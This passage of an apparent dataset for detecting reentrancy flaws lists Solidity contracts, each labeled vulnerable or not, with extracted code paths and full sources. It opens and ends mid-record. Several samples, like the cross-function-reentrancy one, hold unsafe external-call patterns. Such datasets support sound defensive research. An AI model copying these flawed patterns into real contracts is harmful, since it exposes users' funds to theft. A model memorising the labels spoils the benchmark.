onlyOwner() {if (owner != msg.sender) throw; _;} function DaoChallenge () { owner = msg.sender; } function () noEther { } function createAccount () noEther returns (DaoAccount account) { address accountOwner = msg.sender; address challengeOwner = owner; if(daoAccounts[accountOwner] != DaoAccount(0x00)) throw; daoAccounts[accountOwner] = new DaoAccount(accountOwner, challengeOwner); return daoAccounts[accountOwner]; } function myAccount () noEther returns (DaoAccount) { address accountOwner = msg.sender; return daoAccounts[accountOwner]; } function terminate() noEther onlyOwner { notifyTerminate(this.balance); suicide(owner); } } "}
{"sol name": "cross-function-reentrancy.sol", "label": 1, "first path": "function WithdrawReward(address recipient) public { uint amountToWithdraw = rewardsForA[recipient]; rewardsForA[recipient] = 0; require(recipient.call.value(amountToWithdraw)()); function GetFirstWithdrawalBonus(address recipient) public { if (claimedBonus[recipient] == false) { throw; rewardsForA[recipient] += 100; untrustedWithdrawReward(recipient); claimedBonus[recipient] = true; ", "second path": "function WithdrawReward(address recipient) public { uint amountToWithdraw = rewardsForA[recipient]; rewardsForA[recipient] = 0; require(recipient.call.value(amountToWithdraw)()); function GetFirstWithdrawalBonus(address recipient) public { if (claimedBonus[recipient] == false) { throw; rewardsForA[recipient] += 100; untrustedWithdrawReward(recipient); claimedBonus[recipient] = true; ", "third path": "function WithdrawReward(address recipient) public { uint amountToWithdraw = rewardsForA[recipient]; rewardsForA[recipient] = 0; require(recipient.call.value(amountToWithdraw)()); function GetFirstWithdrawalBonus(address recipient) public { if (claimedBonus[recipient] == false) { throw; rewardsForA[recipient] += 100; untrustedWithdrawReward(recipient); claimedBonus[recipient] = true; ", "long path": "pragma solidity ^0.4.18; contract Owner{ mapping (address => uint) private userBalances; mapping (address => bool) private claimedBonus; mapping (address => uint) private rewardsForA; function WithdrawReward(address recipient) public { uint amountToWithdraw = rewardsForA[recipient]; rewardsForA[recipient] = 0; require(recipient.call.value(amountToWithdraw)()); } function GetFirstWithdrawalBonus(address recipient) public { if (claimedBonus[recipient] == false) { throw; } rewardsForA[recipient] += 100; untrustedWithdrawReward(recipient); claimedBonus[recipient] = true; } } "}
{"sol name": "25196.sol", "label": 1, "first path": "function getTokens(uint num, address tokenBuyerContract) public { tokenBuyerContract.call.value(0 wei)(); ", "second path": "function getTokens(uint num, address tokenBuyerContract) public { tokenBuyerContract.call.value(0 wei)(); ", "third path": "function getTokens(uint num, address tokenBuyerContract) public { tokenBuyerContract.call.value(0 wei)(); ", "long path": "pragma solidity ^0.4.19; contract Token { function transfer(address _to, uint _value) returns (bool success); function balanceOf(address _owner) constant returns (uint balance); } contract FruitFarm { address owner; function FruitFarm() { owner = msg.sender; } function getTokenBalance(address tokenContract) public returns (uint balance){ Token tc = Token(tokenContract); return tc.balanceOf(this); } function withdrawTokens(address tokenContract) public { Token tc = Token(tokenContract); tc.transfer(owner, tc.balanceOf(this)); } function withdrawEther() public { owner.transfer(this.balance); } function getTokens(uint num, address tokenBuyerContract) public { tokenBuyerContract.call.value(0 wei)(); } } "}
{"sol name": "27024.sol", "label": 0, "first path": "function participate() payable onlyHuman { require(msg.value == 0.1 ether); require(!participated[msg.sender]); if (luckyNumberOfAddress(msg.sender) == winnerLuckyNumber)  { participated[msg.sender] = true; require(msg.sender.call.value(this.balance)()); ", "second path": "function participate() payable onlyHuman { require(msg.value == 0.1 ether); require(!participated[msg.sender]); if (luckyNumberOfAddress(msg.sender) == winnerLuckyNumber)  { participated[msg.sender] = true; require(msg.sender.call.value(this.balance)()); ", "third path": "function participate() payable onlyHuman { require(msg.value == 0.1 ether); require(!participated[msg.sender]); if (luckyNumberOfAddress(msg.sender) == winnerLuckyNumber)  { participated[msg.sender] = true; require(msg.sender.call.value(this.balance)()); ", "long path": "pragma solidity ^0.4.0; contract AddressLottery{ struct SeedComponents{ uint component1; uint component2; uint component3; uint component4; } address owner; uint private secretSeed; uint private lastReseed; uint winnerLuckyNumber = 7; mapping (address => bool) participated; function AddressLottery() { owner = msg.sender; reseed(SeedComponents(12345678, 0x12345678, 0xabbaeddaacdc, 0x22222222)); } modifier onlyOwner() { require(msg.sender == owner); _; } modifier onlyHuman() { require(msg.sender == tx.origin); _; } function participate() payable onlyHuman { require(msg.value == 0.1 ether); require(!participated[msg.sender]); if (luckyNumberOfAddress(msg.sender) == winnerLuckyNumber)  { participated[msg.sender] = true; require(msg.sender.call.value(this.balance)()); } } function luckyNumberOfAddress(address addr) constant returns(uint n){ n = uint(keccak256(uint(addr), secretSeed)[0]) % 8; } function reseed(SeedComponents components) internal{ secretSeed = uint256(keccak256( components.component1, components.component2, components.component3, components.component4 )); lastReseed = block.number; } function kill() onlyOwner { suicide(owner); } function forceReseed() onlyOwner{ SeedComponents s; s.component1 = uint(msg.sender); s.component2 = uint256(block.blockhash(block.number - 1)); s.component3 = block.number * 1337; s.component4 = tx.gasprice * 7; reseed(s); } function () payable {} function _myLuckyNumber() constant returns(uint n){ n = luckyNumberOfAddress(msg.sender); } } "}
{"sol name": "simple_dao_fixed.sol", "label": 0, "first path": "function withdraw(uint amount) public { if (credit[msg.sender]>= amount) { credit[msg.sender]-=amount; require(msg.sender.call.value(amount)()); ", "second path": "function withdraw(uint amount) public { if (credit[msg.sender]>= amount) { credit[msg.sender]-=amount; require(msg.sender.call.value(amount)()); ", "third path": "function withdraw(uint amount) public { if (credit[msg.sender]>= amount) { credit[msg.sender]-=amount; require(msg.sender.call.value(amount)()); ", "long path": "pragma solidity ^0.4.24; contract SimpleDAO { mapping (address => uint) public credit; function donate(address to) payable public{ credit[to] += msg.value; } function withdraw(uint amount) public { if (credit[msg.sender]>= amount) { credit[msg.sender]-=amount; require(msg.sender.call.value(amount)()); } } function queryCredit(address to) view public returns (uint){ return credit[to]; } } "}
{"sol name": "35421.sol", "label": 0, "first path": "function tryExec(address target, bytes calldata, uint256 value) mutex() internal  returns (bool call_ret){ return target.call.value(value)(calldata); function exec( address target, bytes calldata, uint256 value) internal { assert(tryExec(target, calldata, value)); contract canFreeze is owned { bool public frozen=false; modifier LockIfFrozen() { if (!frozen){ _; function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) \tinternal { uint128 _ETHReturned; if(0==Risk.totalSupply()){_Price=lastPrice;} _ETHReturned = wdiv(_details.amount , _Price); if (Static.meltCoin(_details.holder,_details.amount)){ EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price); if (wless(cast(this.balance),_ETHReturned)) { _ETHReturned=cast(this.balance); bytes memory calldata; if (tryExec(_details.holder, calldata, _ETHReturned)) { } else { Static.mintCoin(_details.holder,_details.amount); EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price); if ( 0==this.balance) { Bankrupt(); function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal { uint128 _ETHReturned; uint128 CurRiskPrice; CurRiskPrice=RiskPrice(_Price); if(CurRiskPrice>0){ _ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price); if (Risk.meltCoin(_details.holder,_details.amount )){ EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price); if ( wless(cast(this.balance),_ETHReturned)) { _ETHReturned=cast(this.balance); bytes memory calldata; if (tryExec(_details.holder, calldata, _ETHReturned)) { } else { Risk.mintCoin(_details.holder,_details.amount); EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price); }  else { ", "second path": "function tryExec(address target, bytes calldata, uint256 value) mutex() internal  returns (bool call_ret){ return target.call.value(value)(calldata); function exec( address target, bytes calldata, uint256 value) internal { assert(tryExec(target, calldata, value)); contract canFreeze is owned { bool public frozen=false; modifier LockIfFrozen() { if (!frozen){ _; function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) \tinternal { uint128 _ETHReturned; if(0==Risk.totalSupply()){_Price=lastPrice;} _ETHReturned = wdiv(_details.amount , _Price); if (Static.meltCoin(_details.holder,_details.amount)){ EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price); if (wless(cast(this.balance),_ETHReturned)) { _ETHReturned=cast(this.balance); bytes memory calldata; if (tryExec(_details.holder, calldata, _ETHReturned)) { } else { Static.mintCoin(_details.holder,_details.amount); EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price); if ( 0==this.balance) { Bankrupt(); function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal { uint128 _ETHReturned; uint128 CurRiskPrice; CurRiskPrice=RiskPrice(_Price); if(CurRiskPrice>0){ _ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price); if (Risk.meltCoin(_details.holder,_details.amount )){ EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price); if ( wless(cast(this.balance),_ETHReturned)) { _ETHReturned=cast(this.balance); bytes memory calldata; if (tryExec(_details.holder, calldata, _ETHReturned)) { } else { Risk.mintCoin(_details.holder,_details.amount); EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price); }  else { ", "third path": "function tryExec(address target, bytes calldata, uint256 value) mutex() internal  returns (bool call_ret){ return target.call.value(value)(calldata); function exec( address target, bytes calldata, uint256 value) internal { assert(tryExec(target, calldata, value)); contract canFreeze is owned { bool public frozen=false; modifier LockIfFrozen() { if (!frozen){ _; function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) \tinternal { uint128 _ETHReturned; if(0==Risk.totalSupply()){_Price=lastPrice;} _ETHReturned = wdiv(_details.amount , _Price); if (Static.meltCoin(_details.holder,_details.amount)){ EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price); if (wless(cast(this.balance),_ETHReturned)) { _ETHReturned=cast(this.balance); bytes memory calldata; if (tryExec(_details.holder, calldata, _ETHReturned)) { } else { Static.mintCoin(_details.holder,_details.amount); EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price); if ( 0==this.balance) { Bankrupt(); function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal { uint128 _ETHReturned; uint128 CurRiskPrice; CurRiskPrice=RiskPrice(_Price); if(CurRiskPrice>0){ _ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price); if (Risk.meltCoin(_details.holder,_details.amount )){ EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price); if ( wless(cast(this.balance),_ETHReturned)) { _ETHReturned=cast(this.balance); bytes memory calldata; if (tryExec(_details.holder, calldata, _ETHReturned)) { } else { Risk.mintCoin(_details.holder,_details.amount); EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price); }  else { ", "long path": "pragma solidity ^0.4.16; contract owned  { address owner; function owned() { owner = msg.sender; } function changeOwner(address newOwner) onlyOwner { owner = newOwner; } modifier onlyOwner() { if (msg.sender==owner) _; } } contract mortal is owned() { function kill() onlyOwner { if (msg.sender == owner) selfdestruct(owner); } } contract DSMath { function hmore(uint128 x, uint128 y) constant internal returns (bool) { return x>y; } function hless(uint128 x, uint128 y) constant internal returns (bool) { return x<y; } function hadd(uint128 x, uint128 y) constant internal returns (uint128 z) { require((z = x + y) >= x); } function hsub(uint128 x, uint128 y) constant internal returns (uint128 z) { require((z = x - y) <= x); } function hmul(uint128 x, uint128 y) constant internal returns (uint128 z) { require(y == 0 ||(z = x * y)/ y == x); } function hdiv(uint128 x, uint128 y) constant internal returns (uint128 z) { z = x / y; } function hmin(uint128 x, uint128 y) constant internal returns (uint128 z) { return x <= y ? x : y; } function hmax(uint128 x, uint128 y) constant internal returns (uint128 z) { return x >= y ? x : y; } uint64 constant WAD_Dec=18; uint128 constant WAD = 10 ** 18; function wmore(uint128 x, uint128 y) constant internal returns (bool) { return hmore(x, y); } function wless(uint128 x, uint128 y) constant internal returns (bool) { return hless(x, y); } function wadd(uint128 x, uint128 y) constant  returns (uint128) { return hadd(x, y); } function wsub(uint128 x, uint128 y) constant   returns (uint128) { return hsub(x, y); } function wmul(uint128 x, uint128 y) constant returns (uint128 z) { z = cast((uint256(x) * y + WAD / 2) / WAD); } function wdiv(uint128 x, uint128 y) constant internal  returns (uint128 z) { z = cast((uint256(x) * WAD + y / 2) / y); } function wmin(uint128 x, uint128 y) constant internal  returns (uint128) { return hmin(x, y); } function wmax(uint128 x, uint128 y) constant internal  returns (uint128) { return hmax(x, y); } function cast(uint256 x) constant internal returns (uint128 z) { assert((z = uint128(x)) == x); } } contract I_minter { event EventCreateStatic(address indexed _from, uint128 _value, uint _transactionID, uint _Price); event EventRedeemStatic(address indexed _from, uint128 _value, uint _transactionID, uint _Price); event EventCreateRisk(address indexed _from, uint128 _value, uint _transactionID, uint _Price); event EventRedeemRisk(address indexed _from, uint128 _value, uint _transactionID, uint _Price); event EventBankrupt(); function Leverage() constant returns (uint128)  {} function RiskPrice(uint128 _currentPrice,uint128 _StaticTotal,uint128 _RiskTotal, uint128 _ETHTotal) constant returns (uint128 price)  {} function RiskPrice(uint128 _currentPrice) constant returns (uint128 price)  {} function PriceReturn(uint _TransID,uint128 _Price) {} function NewStatic() external payable returns (uint _TransID)  {} function NewStaticAdr(address _Risk) external payable returns (uint _TransID)  {} function NewRisk() external payable returns (uint _TransID)  {} function NewRiskAdr(address _Risk) external payable returns (uint _TransID)  {} function RetRisk(uint128 _Quantity) external payable returns (uint _TransID)  {} function RetStatic(uint128 _Quantity) external payable returns (uint _TransID)  {} function Strike() constant returns (uint128)  {} } contract I_Pricer { uint128 public lastPrice; I_minter public mint; string public sURL; mapping (bytes32 => uint) RevTransaction; function setMinter(address _newAddress) {} function __callback(bytes32 myid, string result) {} function queryCost() constant returns (uint128 _value) {} function QuickPrice() payable {} function requestPrice(uint _actionID) payable returns (uint _TrasID) {} function collectFee() returns(bool) {} function () { revert(); } } contract I_coin is mortal { event EventClear(); I_minter public mint; string public name; uint8 public decimals=18; string public symbol; string public version = ''; function mintCoin(address target, uint256 mintedAmount) returns (bool success) {} function meltCoin(address target, uint256 meltedAmount) returns (bool success) {} function approveAndCall(address _spender, uint256 _value, bytes _extraData){} function setMinter(address _minter) {} function increaseApproval (address _spender, uint256 _addedValue) returns (bool success) {} function decreaseApproval (address _spender, uint256 _subtractedValue) \treturns (bool success) {} function balanceOf(address _owner) constant returns (uint256 balance) {} function transfer(address _to, uint256 _value) returns (bool success) {} function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {} function approve(address _spender, uint256 _value) returns (bool success) {} event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); function allowance(address _owner, address _spender) constant returns (uint256 remaining) {} mapping (address => uint256) balances; mapping (address => mapping (address => uint256)) allowed; uint256 public totalSupply; } contract DSBaseActor { bool _ds_mutex; modifier mutex() { assert(!_ds_mutex); _ds_mutex = true; _; _ds_mutex = false; } function tryExec(address target, bytes calldata, uint256 value) mutex() internal  returns (bool call_ret){ return target.call.value(value)(calldata); } function exec( address target, bytes calldata, uint256 value) internal { assert(tryExec(target, calldata, value)); } } contract canFreeze is owned { bool public frozen=false; modifier LockIfFrozen() { if (!frozen){ _; } } function Freeze() onlyOwner { frozen=true; } } contract oneWrite { bool written = false; function oneWrite() { written = false; } modifier LockIfUnwritten() { if (written){ _; } } modifier writeOnce() { if (!written){ written=true; _; } } } contract pricerControl is canFreeze { I_Pricer public pricer; address public future; uint256 public releaseTime; uint public PRICER_DELAY = 2; event EventAddressChange(address indexed _from, address indexed _to, uint _timeChange); function setPricer(address newAddress) onlyOwner { releaseTime = now + PRICER_DELAY; future = newAddress; EventAddressChange(pricer, future, releaseTime); } modifier updates() { if (now > releaseTime  && pricer != future){ update(); } _; } modifier onlyPricer() { if (msg.sender==address(pricer)) _; } function update() internal { pricer =  I_Pricer(future); frozen = false; } } contract minter is I_minter, DSBaseActor, oneWrite, pricerControl, DSMath{ enum Action {NewStatic, RetStatic, NewRisk, RetRisk} struct Trans { uint128 amount; address holder; Action action; uint pricerID; } uint128 public lastPrice; uint public TransID=0; string public Currency; I_coin public Static; I_coin public Risk; uint128 public Multiplier; uint128 public levToll=5*10**(18-1); uint128 public mintFee = 2*10**(18-3); mapping (uint => Trans[]) public pending; event EventCreateStatic(address indexed _from, uint128 _value, uint _transactionID, uint _Price); event EventRedeemStatic(address indexed _from, uint128 _value, uint _transactionID, uint _Price); event EventCreateRisk(address indexed _from, uint128 _value, uint _transactionID, uint _Price); event EventRedeemRisk(address indexed _from, uint128 _value, uint _transactionID, uint _Price); event EventBankrupt(); function minter(string _currency, uint128 _Multiplier) { Currency=_currency; Multiplier = _Multiplier; } function () { revert(); } function Bailout() \texternal payable \t{ } function NewStatic() external payable returns (uint _TransID) { _TransID=NewCoinInternal(msg.sender,cast(msg.value),Action.NewStatic); } function NewStaticAdr(address _user) external payable returns (uint _TransID)  { _TransID=NewCoinInternal(_user,cast(msg.value),Action.NewStatic); } function NewRisk() external payable returns (uint _TransID)  { _TransID=NewCoinInternal(msg.sender,cast(msg.value),Action.NewRisk); } function NewRiskAdr(address _user) \texternal payable returns (uint _TransID)  { _TransID=NewCoinInternal(_user,cast(msg.value),Action.NewRisk); } function RetRisk(uint128 _Quantity) external payable LockIfUnwritten  returns (uint _TransID)  { if(frozen){ TransID++; ActionRetRisk(Trans(_Quantity,msg.sender,Action.RetRisk,0),TransID,lastPrice); _TransID=TransID; } else { _TransID=RetCoinInternal(_Quantity,cast(msg.value),msg.sender,Action.RetRisk); } } function RetStatic(uint128 _Quantity) external payable LockIfUnwritten returns (uint _TransID)  { if(frozen){ TransID++; ActionRetStatic(Trans(_Quantity,msg.sender,Action.RetStatic,0),TransID,lastPrice); _TransID=TransID; } else { _TransID=RetCoinInternal(_Quantity,cast(msg.value),msg.sender,Action.RetStatic); } } function StaticEthAvailable() \tconstant returns (uint128)  { return StaticEthAvailable(cast(Risk.totalSupply()), cast(this.balance)); } function StaticEthAvailable(uint128 _RiskTotal, uint128 _TotalETH) \tconstant \treturns (uint128)  { uint128 temp = wmul(wadd(Multiplier,levToll),_RiskTotal); if(wless(_TotalETH,temp)){ return wsub(temp ,_TotalETH); } else { return 0; } } function RiskPrice(uint128 _currentPrice,uint128 _StaticTotal,uint128 _RiskTotal, uint128 _ETHTotal) constant \treturns (uint128 price)  { if(_ETHTotal == 0 || _RiskTotal==0){ return wmul( _currentPrice , Multiplier); } else { if(hmore( wmul(_ETHTotal , _currentPrice),_StaticTotal)){ return wdiv(wsub(wmul(_ETHTotal , _currentPrice) , _StaticTotal) , _RiskTotal); } else  { return 0; } } } function RiskPrice() constant returns (uint128 price)  { return RiskPrice(lastPrice); } function RiskPrice(uint128 _currentPrice) \tconstant \treturns (uint128 price)  { return RiskPrice(_currentPrice,cast(Static.totalSupply()),cast(Risk.totalSupply()),cast(this.balance)); } function Leverage() public constant returns (uint128)  { if(Risk.totalSupply()>0){ return wdiv(cast(this.balance) , cast(Risk.totalSupply())); }else{ return 0; } } function Strike() public constant returns (uint128)  { if(this.balance>0){ return wdiv(cast(Static.totalSupply()) , cast(this.balance)); }else{ return 0; } } function setFee(uint128 _newFee) onlyOwner { mintFee=_newFee; } function setCoins(address newRisk,address newStatic) updates onlyOwner \twriteOnce { Risk=I_coin(newRisk); Static=I_coin(newStatic); PRICER_DELAY = 2 days; } function PriceReturn(uint _TransID,uint128 _Price) \tonlyPricer { Trans memory details=pending[_TransID][0]; if(0==_Price||frozen){ _Price=lastPrice; } else { if(Static.totalSupply()>0 && Risk.totalSupply()>0) { lastPrice=_Price; } } if(Action.NewStatic==details.action){ ActionNewStatic(details,_TransID, _Price); } if(Action.RetStatic==details.action){ ActionRetStatic(details,_TransID, _Price); } if(Action.NewRisk==details.action){ ActionNewRisk(details,_TransID, _Price); } if(Action.RetRisk==details.action){ ActionRetRisk(details,_TransID, _Price); } delete pending[_TransID]; } function ActionNewStatic(Trans _details, uint _TransID, uint128 _Price) internal { uint128 CurRiskPrice=RiskPrice(_Price); uint128 AmountReturn; uint128 AmountMint; uint128 StaticAvail = StaticEthAvailable(cast(Risk.totalSupply()), wsub(cast(this.balance),_details.amount)); if (wless(_details.amount,StaticAvail)) { AmountMint = _details.amount; AmountReturn = 0; } else { AmountMint = StaticAvail; AmountReturn = wsub(_details.amount , StaticAvail) ; } if(0 == CurRiskPrice){ AmountReturn = _details.amount; } if(CurRiskPrice > 0  && StaticAvail>0 ){ Static.mintCoin(_details.holder, uint256(wmul(AmountMint , _Price))); EventCreateStatic(_details.holder, wmul(AmountMint , _Price), _TransID, _Price); } if (AmountReturn>0) { bytes memory calldata; exec(_details.holder,calldata, AmountReturn); } } function ActionNewRisk(Trans _details, uint _TransID,uint128 _Price) internal { uint128 CurRiskPrice; if(wless(cast(this.balance),_details.amount)){ CurRiskPrice=RiskPrice(_Price,cast(Static.totalSupply()),cast(Risk.totalSupply()),0); } else { CurRiskPrice=RiskPrice(_Price,cast(Static.totalSupply()),cast(Risk.totalSupply()),wsub(cast(this.balance),_details.amount)); } if(CurRiskPrice>0){ uint128 quantity=wdiv(wmul(_details.amount , _Price),CurRiskPrice); Risk.mintCoin(_details.holder, uint256(quantity) ); EventCreateRisk(_details.holder, quantity, _TransID, _Price); } else { bytes memory calldata; exec(_details.holder,calldata, _details.amount); } } function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) \tinternal { uint128 _ETHReturned; if(0==Risk.totalSupply()){_Price=lastPrice;} _ETHReturned = wdiv(_details.amount , _Price); if (Static.meltCoin(_details.holder,_details.amount)){ EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price); if (wless(cast(this.balance),_ETHReturned)) { _ETHReturned=cast(this.balance); } bytes memory calldata; if (tryExec(_details.holder, calldata, _ETHReturned)) { } else { Static.mintCoin(_details.holder,_details.amount); EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price); } if ( 0==this.balance) { Bankrupt(); } } } function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal { uint128 _ETHReturned; uint128 CurRiskPrice; CurRiskPrice=RiskPrice(_Price); if(CurRiskPrice>0){ _ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price); if (Risk.meltCoin(_details.holder,_details.amount )){ EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price); if ( wless(cast(this.balance),_ETHReturned)) { _ETHReturned=cast(this.balance); } bytes memory calldata; if (tryExec(_details.holder, calldata, _ETHReturned)) { } else { Risk.mintCoin(_details.holder,_details.amount); EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price); } } }  else { } } function IsWallet(address _address) internal returns(bool){ uint codeLength; assembly { codeLength := extcodesize(_address) } return(0==codeLength); } function RetCoinInternal(uint128 _Quantity, uint128 _AmountETH, address _user, Action _action) internal updates\treturns (uint _TransID)  { require(IsWallet(_user)); uint128 refund; uint128 Fee=pricer.queryCost(); if(wless(_AmountETH,Fee)){ revert(); } else { refund=wsub(_AmountETH,Fee); } if(0==_Quantity){revert();} TransID++; uint PricerID = pricer.requestPrice.value(uint256(Fee))(TransID); pending[TransID].push(Trans(_Quantity,_user,_action,PricerID)); _TransID=TransID; _user.transfer(uint256(refund)); } function NewCoinInternal(address _user, uint128 _amount, Action _action) internal updates LockIfUnwritten LockIfFrozen  returns (uint _TransID)  { require(IsWallet(_user)); uint128 Fee=wmax(wmul(_amount,mintFee),pricer.queryCost()); if(wless(_amount,Fee)) revert(); TransID++; uint PricerID = pricer.requestPrice.value(uint256(Fee))(TransID); pending[TransID].push(Trans(wsub(_amount,Fee),_user,_action,PricerID)); _TransID=TransID; } function Bankrupt() internal { EventBankrupt(); Static.kill(); Risk.kill(); frozen=false; written=false; } } "}
{"sol name": "347.sol", "label": 0, "first path": "function _forwardFunds() internal { bool isTransferDone = wallet.call.value(msg.value).gas(gasAmount)(); emit TokensTransfer (msg.sender, wallet, msg.value, isTransferDone); ", "second path": "function _forwardFunds() internal { bool isTransferDone = wallet.call.value(msg.value).gas(gasAmount)(); emit TokensTransfer (msg.sender, wallet, msg.value, isTransferDone); ", "third path": "function _forwardFunds() internal { bool isTransferDone = wallet.call.value(msg.value).gas(gasAmount)(); emit TokensTransfer (msg.sender, wallet, msg.value, isTransferDone); ", "long path": "pragma solidity ^0.4.24; library SafeMath { function mul(uint256 _a, uint256 _b) internal pure returns (uint256) { if (_a == 0) { return 0; } uint256 c = _a * _b; require(c / _a == _b); return c; } function div(uint256 _a, uint256 _b) internal pure returns (uint256) { require(_b > 0); uint256 c = _a / _b; return c; } function sub(uint256 _a, uint256 _b) internal pure returns (uint256) { require(_b <= _a); uint256 c = _a - _b; return c; } function add(uint256 _a, uint256 _b) internal pure returns (uint256) { uint256 c = _a + _b; require(c >= _a); return c; } function mod(uint256 a, uint256 b) internal pure returns (uint256) { require(b != 0); return a % b; } } library SafeERC20 { function safeTransfer(ERC20 _token, address _to, uint256 _value) internal { require(_token.transfer(_to, _value)); } function safeTransferFrom(ERC20 _token, address _from, address _to, uint256 _value) internal { require(_token.transferFrom(_from, _to, _value)); } function safeApprove(ERC20 _token, address _spender, uint256 _value) internal { require(_token.approve(_spender, _value)); } } contract Ownable { address public owner; event OwnershipRenounced(address indexed previousOwner); event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); constructor() public { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function renounceOwnership() public onlyOwner { emit OwnershipRenounced(owner); owner = address(0); } function transferOwnership(address _newOwner) public onlyOwner { _transferOwnership(_newOwner); } function _transferOwnership(address _newOwner) internal { require(_newOwner != address(0)); emit OwnershipTransferred(owner, _newOwner); owner = _newOwner; } } contract ERC20 { function totalSupply() public view returns (uint256); function balanceOf(address _who) public view returns (uint256); function allowance(address _owner, address _spender) public view returns (uint256); function transfer(address _to, uint256 _value) public returns (bool); function approve(address _spender, uint256 _value) public returns (bool); function transferFrom(address _from, address _to, uint256 _value) public returns (bool); event Transfer( address indexed from, address indexed to, uint256 value ); event Approval( address indexed owner, address indexed spender, uint256 value ); } contract AddressesFilterFeature is Ownable {} contract ERC20Basic {} contract BasicToken is ERC20Basic {} contract StandardToken is ERC20, BasicToken {} contract MintableToken is AddressesFilterFeature, StandardToken {} contract Token is MintableToken { function mint(address, uint256) public returns (bool); } contract CrowdsaleWPTByRounds is Ownable { using SafeMath for uint256; using SafeERC20 for ERC20; ERC20 public token; address public wallet; Token public minterContract; uint256 public rate; uint256 public tokensRaised; uint256 public cap; uint256 public openingTime; uint256 public closingTime; uint public minInvestmentValue; bool public checksOn; uint256 public gasAmount; function setMinter(address _minterAddr) public onlyOwner { minterContract = Token(_minterAddr); } modifier onlyWhileOpen { require(block.timestamp >= openingTime && block.timestamp <= closingTime); _; } event TokenPurchase( address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount ); event TokensTransfer( address indexed _from, address indexed _to, uint256 amount, bool isDone ); constructor () public { rate = 400; wallet = 0xeA9cbceD36a092C596e9c18313536D0EEFacff46; cap = 400000000000000000000000; openingTime = 1534558186; closingTime = 1535320800; minInvestmentValue = 0.02 ether; checksOn = true; gasAmount = 25000; } function capReached() public view returns (bool) { return tokensRaised >= cap; } function changeRate(uint256 newRate) public onlyOwner { rate = newRate; } function closeRound() public onlyOwner { closingTime = block.timestamp + 1; } function setToken(ERC20 _token) public onlyOwner { token = _token; } function setWallet(address _wallet) public onlyOwner { wallet = _wallet; } function changeMinInvest(uint256 newMinValue) public onlyOwner { rate = newMinValue; } function setChecksOn(bool _checksOn) public onlyOwner { checksOn = _checksOn; } function setGasAmount(uint256 _gasAmount) public onlyOwner { gasAmount = _gasAmount; } function setCap(uint256 _newCap) public onlyOwner { cap = _newCap; } function startNewRound(uint256 _rate, address _wallet, ERC20 _token, uint256 _cap, uint256 _openingTime, uint256 _closingTime) payable public onlyOwner { require(!hasOpened()); rate = _rate; wallet = _wallet; token = _token; cap = _cap; openingTime = _openingTime; closingTime = _closingTime; } function hasClosed() public view returns (bool) { return block.timestamp > closingTime; } function hasOpened() public view returns (bool) { return (openingTime < block.timestamp && block.timestamp < closingTime); } function () payable external { buyTokens(msg.sender); } function buyTokens(address _beneficiary) payable public{ uint256 weiAmount = msg.value; if (checksOn) { _preValidatePurchase(_beneficiary, weiAmount); } uint256 tokens = _getTokenAmount(weiAmount); tokensRaised = tokensRaised.add(tokens); minterContract.mint(_beneficiary, tokens); emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens); _forwardFunds(); } function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal view onlyWhileOpen { require(_beneficiary != address(0)); require(_weiAmount != 0 && _weiAmount > minInvestmentValue); require(tokensRaised.add(_getTokenAmount(_weiAmount)) <= cap); } function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal { token.safeTransfer(_beneficiary, _tokenAmount); } function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal { _deliverTokens(_beneficiary, _tokenAmount); } function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) { return _weiAmount.mul(rate); } function _forwardFunds() internal { bool isTransferDone = wallet.call.value(msg.value).gas(gasAmount)(); emit TokensTransfer (msg.sender, wallet, msg.value, isTransferDone); } } "}
{"sol name": "3985.sol", "label": 0, "first path": "function performFeelessTransaction(address sender, address target, bytes data, uint256 nonce, bytes sig) public payable { require(this == target); bytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\"; bytes32 hash = keccak256(prefix, keccak256(target, data, nonce)); msgSender = ECRecovery.recover(hash, sig); require(msgSender == sender); require(nonces[msgSender]++ == nonce); require(target.call.value(msg.value)(data)); msgSender = address(0); ", "second path": "function performFeelessTransaction(address sender, address target, bytes data, uint256 nonce, bytes sig) public payable { require(this == target); bytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\"; bytes32 hash = keccak256(prefix, keccak256(target, data, nonce)); msgSender = ECRecovery.recover(hash, sig); require(msgSender == sender); require(nonces[msgSender]++ == nonce); require(target.call.value(msg.value)(data)); msgSender = address(0); ", "third path": "function performFeelessTransaction(address sender, address target, bytes data, uint256 nonce, bytes sig) public payable { require(this == target); bytes memory prefix = 